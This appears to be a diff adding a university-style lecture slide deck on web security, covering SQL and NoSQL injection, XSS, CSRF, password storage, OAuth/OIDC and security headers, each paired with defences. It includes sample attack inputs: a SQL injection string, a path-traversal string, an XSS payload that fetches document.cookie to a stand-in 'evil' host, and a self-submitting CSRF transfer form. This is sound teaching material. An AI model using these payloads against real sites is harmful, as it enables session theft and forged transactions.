@@ -1,0 +1,511 @@
+---
+index: 11
+title: Web Security
+topics:
+  - Introduction
+  - Injection
+  - Cross-Site Scripting
+  - Cross-Site Request Forgery
+  - Authentication & Authorization
+  - Transport & Headers
+---
+
+<section>
+  <div class="toc"></div>
+</section>
+<section>
+  <div class="toc" data-selected="0"></div>
+</section>
+<section>
+  <h2>Why Security?</h2>
+  <ul>
+    <li>
+      A web application is a program that runs
+      <strong class="hl-red">arbitrary input from strangers</strong>
+    </li>
+    <li>Everything the client sends is under the attacker's control</li>
+    <ul>
+      <li>Query parameters, headers, cookies, request body</li>
+      <li>
+        Even the fields your own form generated: the browser is
+        <em class="hl-orange">not</em> a trusted environment
+      </li>
+    </ul>
+    <li>
+      The <span class="hl-green">same-origin policy</span> and
+      <span class="hl-cyan">CORS</span> protect the <strong>browser</strong>,
+      not your server
+    </li>
+  </ul>
+</section>
+<section>
+  <h2>The Golden Rule</h2>
+  <div class="box">
+    <p>Never mix <em>data</em> with <em>code</em>.</p>
+  </div>
+  <ul>
+    <li>
+      Almost every vulnerability in this lecture is one bug: data supplied by a
+      user is parsed as instructions by some interpreter
+    </li>
+    <ul>
+      <li>SQL injection: data becomes part of a SQL query</li>
+      <li>XSS: data becomes part of an HTML document</li>
+      <li>Command injection: data becomes part of a shell command</li>
+    </ul>
+    <li>
+      The fix is always the same shape:
+      <strong class="hl-green">keep them separate</strong>, do not try to
+      sanitize your way out
+    </li>
+  </ul>
+</section>
+<section>
+  <div class="toc" data-selected="1"></div>
+</section>
+<section>
+  <section>
+    <h2>SQL Injection</h2>
+    <p>Consider a login handler that builds its query by concatenation:</p>
+    <pre><code class="lang-go">
+query := "SELECT id FROM users WHERE name = '" + name + "'"
+    </code></pre>
+    <p>
+      What happens when <code class="hl-yellow">name</code> is
+      <code class="hl-red">' OR '1'='1</code>?
+    </p>
+  </section>
+  <section>
+    <h2>The Query the Database Sees</h2>
+    <pre><code class="lang-sql">
+SELECT id FROM users WHERE name = '' OR '1'='1'
+    </code></pre>
+    <ul>
+      <li>
+        The quote supplied by the user
+        <strong class="hl-red">ended the string</strong> and the rest became SQL
+      </li>
+      <li>
+        The database is behaving correctly. It cannot know which characters came
+        from you and which came from the attacker
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Prepared Statements</h2>
+    <pre><code class="lang-go">
+row := db.QueryRow("SELECT id FROM users WHERE name = $1", name)
+    </code></pre>
+    <ul>
+      <li>
+        The query is sent to the server <em class="hl-green">once</em>, with
+        holes in it, and the values are sent
+        <strong class="hl-green">separately</strong>
+      </li>
+      <li>
+        The value can never become SQL, whatever characters it contains, so
+        there is nothing to escape
+      </li>
+      <li>
+        This is not about quoting quotes: it is a different
+        <span class="hl-cyan">protocol-level</span> mechanism
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Not Only SQL</h2>
+    <ul>
+      <li>
+        <span class="hl-orange">Command injection</span>: passing input to a
+        shell (<code>sh -c</code>). Pass an argument <em>vector</em> instead of
+        a string
+      </li>
+      <li>
+        <span class="hl-orange">NoSQL injection</span>: a JSON body that
+        deserializes into a query object, e.g.
+        <code class="hl-yellow">{"password": {"$ne": null}}</code>
+      </li>
+      <li>
+        <span class="hl-orange">Path traversal</span>: a filename containing
+        <code class="hl-red">../../etc/passwd</code>
+      </li>
+    </ul>
+  </section>
+</section>
+<section>
+  <div class="toc" data-selected="2"></div>
+</section>
+<section>
+  <section>
+    <h2>Cross-Site Scripting (XSS)</h2>
+    <p>
+      The same bug, but the interpreter is the
+      <strong class="hl-cyan">browser</strong> and the injected code is
+      JavaScript.
+    </p>
+    <pre><code class="lang-javascript">
+// a comment box that renders whatever was posted
+element.innerHTML = "&lt;p&gt;" + comment + "&lt;/p&gt;";
+    </code></pre>
+    <p>
+      A comment of
+      <code class="hl-red"
+        >&lt;img src=x onerror="fetch('//evil/'+document.cookie)"&gt;</code
+      >
+      now runs in <em>every visitor's</em> session.
+    </p>
+  </section>
+  <section>
+    <h2>Why It Matters</h2>
+    <ul>
+      <li>
+        The injected script runs with the
+        <strong class="hl-red">full privileges of your origin</strong>
+      </li>
+      <ul>
+        <li>
+          It can read the DOM, cookies (unless HttpOnly), and local storage
+        </li>
+        <li>
+          It can issue requests as the victim, and the same-origin policy will
+          happily allow them: the script <em>is</em> the origin
+        </li>
+      </ul>
+      <li>CORS does not help here. The call is coming from inside the house</li>
+    </ul>
+  </section>
+  <section>
+    <h2>Flavours</h2>
+    <ul>
+      <li>
+        <span class="hl-orange">Stored</span>: the payload is saved on the
+        server (a comment, a profile name) and served to everyone
+      </li>
+      <li>
+        <span class="hl-green">Reflected</span>: the payload travels in the
+        request (a search query echoed back into the page)
+      </li>
+      <li>
+        <span class="hl-cyan">DOM-based</span>: the server is never involved;
+        client-side code copies <code>location.hash</code> into the page
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Defence: Encode on Output</h2>
+    <ul>
+      <li>
+        Encode data
+        <strong class="hl-green">for the context it lands in</strong>: HTML
+        body, attribute, URL, and JavaScript all differ
+      </li>
+      <li>
+        Use the framework's escaping and do not defeat it:
+        <code class="hl-red">innerHTML</code> and
+        <code class="hl-red">dangerouslySetInnerHTML</code> opt out of it
+      </li>
+      <li>
+        <code class="hl-green">textContent</code> is safe by construction, it
+        cannot create elements
+      </li>
+    </ul>
+    <pre><code class="lang-javascript">
+element.textContent = comment; // never parsed as html
+    </code></pre>
+  </section>
+  <section>
+    <h2>Defence in Depth</h2>
+    <ul>
+      <li>
+        <code class="hl-yellow">Content-Security-Policy</code>: tell the browser
+        which sources may execute, so an injected inline script is refused
+      </li>
+      <li>
+        <code class="hl-yellow">HttpOnly</code> cookies: unreadable from
+        JavaScript, so a stolen DOM does not hand over the session
+      </li>
+      <li>These reduce the damage. They do not remove the bug</li>
+    </ul>
+    <pre><code class="lang-http">
+Content-Security-Policy: default-src 'self'
+    </code></pre>
+  </section>
+</section>
+<section>
+  <div class="toc" data-selected="3"></div>
+</section>
+<section>
+  <section>
+    <h2>Cross-Site Request Forgery (CSRF)</h2>
+    <ul>
+      <li>
+        The browser attaches your cookies to a request
+        <strong class="hl-red">no matter who caused it</strong>
+      </li>
+      <li>
+        So a page on <em class="hl-orange">evil.example</em> can cause a request
+        to <em class="hl-green">bank.example</em>, and it will be authenticated
+      </li>
+    </ul>
+    <pre><code class="lang-html">
+&lt;form action="https://bank.example/transfer" method="POST"&gt;
+  &lt;input name="to" value="attacker" /&gt;
+  &lt;input name="amount" value="1000000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+    </code></pre>
+  </section>
+  <section>
+    <h2>Read Versus Write</h2>
+    <ul>
+      <li>
+        The attacker <strong class="hl-red">cannot read</strong> the response:
+        the same-origin policy still holds
+      </li>
+      <li>
+        But they do not need to. The
+        <em class="hl-orange">side effect</em> already happened on the server
+      </li>
+      <li>
+        This is why a <code>GET</code> must never change state, a rule from the
+        HTTP lecture that turns out to be a security rule too
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Defence</h2>
+    <ul>
+      <li>
+        <span class="hl-green">SameSite cookies</span>: tell the browser not to
+        attach the cookie to cross-site requests
+      </li>
+      <ul>
+        <li><code>Lax</code> is the modern browser default</li>
+        <li><code>Strict</code> for anything sensitive</li>
+      </ul>
+      <li>
+        <span class="hl-cyan">CSRF tokens</span>: a per-session random value in
+        the form, which the attacker's page cannot read
+      </li>
+      <li>
+        Bearer tokens in an <code>Authorization</code> header are not attached
+        automatically, so they are not vulnerable to this
+      </li>
+    </ul>
+    <pre><code class="lang-http">
+Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
+    </code></pre>
+  </section>
+</section>
+<section>
+  <div class="toc" data-selected="4"></div>
+</section>
+<section>
+  <section>
+    <h2>Authentication vs Authorization</h2>
+    <ul>
+      <li>
+        <span class="hl-green">Authentication</span>:
+        <em>who are you?</em>
+      </li>
+      <li>
+        <span class="hl-cyan">Authorization</span>:
+        <em>what are you allowed to do?</em>
+      </li>
+      <li>
+        Most real breaches are failures of the second one: the user is who they
+        claim, and asks for someone else's object
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Storing Passwords</h2>
+    <ul>
+      <li>Never store them. Store a <span class="hl-green">hash</span></li>
+      <li>
+        Not SHA-256:
+        <strong class="hl-red">fast hashes are the problem</strong>, a GPU tries
+        billions per second
+      </li>
+      <li>
+        Use a password hash designed to be slow and memory-hard:
+        <span class="hl-yellow">argon2id</span>,
+        <span class="hl-yellow">scrypt</span>, or
+        <span class="hl-yellow">bcrypt</span>
+      </li>
+      <li>They salt each password for you, so identical passwords differ</li>
+    </ul>
+  </section>
+  <section>
+    <h2>Sessions and Tokens</h2>
+    <ul>
+      <li>
+        <span class="hl-orange">Session cookie</span>: the server keeps the
+        state, the cookie is only a lookup key, and revoking is trivial
+      </li>
+      <li>
+        <span class="hl-cyan">JWT</span>: the claims travel inside a signed
+        token, so the server keeps nothing
+      </li>
+      <ul>
+        <li>
+          Signed, <strong class="hl-red">not encrypted</strong>: anyone can read
+          the payload
+        </li>
+        <li>
+          Hard to revoke before expiry, which is why access tokens are
+          short-lived and paired with a refresh token
+        </li>
+      </ul>
+    </ul>
+    <pre><code class="lang-plaintext">
+header.payload.signature   # three base64url parts, separated by dots
+    </code></pre>
+  </section>
+  <section>
+    <h2>OAuth 2.0</h2>
+    <ul>
+      <li>
+        A <strong class="hl-green">delegation</strong> protocol: let an
+        application act on a user's behalf
+        <em class="hl-orange">without giving it the password</em>
+      </li>
+      <li>Four roles</li>
+      <ul>
+        <li>Resource owner: the user</li>
+        <li>Client: the application asking for access</li>
+        <li>Authorization server: issues tokens</li>
+        <li>Resource server: the API holding the data</li>
+      </ul>
+      <li>"Sign in with GitHub" is this, plus an identity layer on top</li>
+    </ul>
+  </section>
+  <section>
+    <h2>Authorization Code Flow</h2>
+    <ul>
+      <li>The client redirects the user to the authorization server</li>
+      <li>The user authenticates <em>there</em>, and approves the scopes</li>
+      <li>
+        The browser comes back with a short-lived
+        <span class="hl-yellow">code</span>
+      </li>
+      <li>
+        The client exchanges that code for a token
+        <strong class="hl-green">from its back-end</strong>, so the token never
+        touches the URL bar
+      </li>
+      <li>
+        Public clients (SPA, mobile) add
+        <span class="hl-cyan">PKCE</span>, which binds the code to whoever
+        started the flow
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>OpenID Connect</h2>
+    <ul>
+      <li>
+        OAuth 2.0 answers <em>"may this app call the API?"</em>, not
+        <em>"who is this user?"</em>
+      </li>
+      <li>
+        <span class="hl-green">OIDC</span> is a thin layer on top that adds an
+        <code class="hl-yellow">id_token</code>: a JWT describing the user
+      </li>
+      <li>
+        Using a raw <em>access</em> token as proof of identity is a classic
+        mistake: it was minted for an API, not for you
+      </li>
+    </ul>
+  </section>
+</section>
+<section>
+  <div class="toc" data-selected="5"></div>
+</section>
+<section>
+  <section>
+    <h2>Transport Security</h2>
+    <ul>
+      <li>
+        <span class="hl-green">HTTPS</span> gives confidentiality, integrity,
+        and authentication of the server
+      </li>
+      <li>
+        Without it, every proxy on the path can read and
+        <strong class="hl-red">modify</strong> the traffic
+      </li>
+      <li>
+        <code class="hl-yellow">Strict-Transport-Security</code> tells the
+        browser never to try plain HTTP again
+      </li>
+    </ul>
+    <pre><code class="lang-http">
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+    </code></pre>
+  </section>
+  <section>
+    <h2>Useful Response Headers</h2>
+    <ul>
+      <li>
+        <code class="hl-yellow">Content-Security-Policy</code>: which sources
+        may load and execute
+      </li>
+      <li>
+        <code class="hl-yellow">X-Content-Type-Options: nosniff</code>: stop the
+        browser guessing a type you did not declare
+      </li>
+      <li>
+        <code class="hl-yellow">X-Frame-Options</code> /
+        <code class="hl-yellow">frame-ancestors</code>: refuse to be framed, so
+        your UI cannot be overlaid and clicked through
+      </li>
+      <li>
+        <code class="hl-yellow">Referrer-Policy</code>: stop leaking full URLs
+        to third parties
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Rules of Thumb</h2>
+    <ul>
+      <li>Validate input, but <strong>encode on output</strong></li>
+      <li>Never build code by concatenating strings</li>
+      <li>
+        Check authorization on the
+        <strong class="hl-green">server</strong>, for every request, on the
+        object being touched
+      </li>
+      <li>Keep secrets out of the repository and out of the front-end</li>
+      <li>Do not invent your own cryptography, or your own session tokens</li>
+      <li>Assume you will get one wrong, and make the blast radius small</li>
+    </ul>
+  </section>
+</section>
+<section>
+  <h2>References 📚</h2>
+  <ul>
+    <li>
+      <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a>
+    </li>
+    <li>
+      <a href="https://cheatsheetseries.owasp.org/">
+        OWASP Cheat Sheet Series
+      </a>
+    </li>
+    <li>
+      <a href="https://developer.mozilla.org/en-US/docs/Web/Security">
+        MDN Web Security
+      </a>
+    </li>
+    <li>
+      <a href="https://datatracker.ietf.org/doc/html/rfc6749">
+        RFC 6749: The OAuth 2.0 Authorization Framework
+      </a>
+    </li>
+    <li>
+      <a href="https://openid.net/developers/how-connect-works/">
+        How OpenID Connect Works
+      </a>
+    </li>
+  </ul>
+</section>
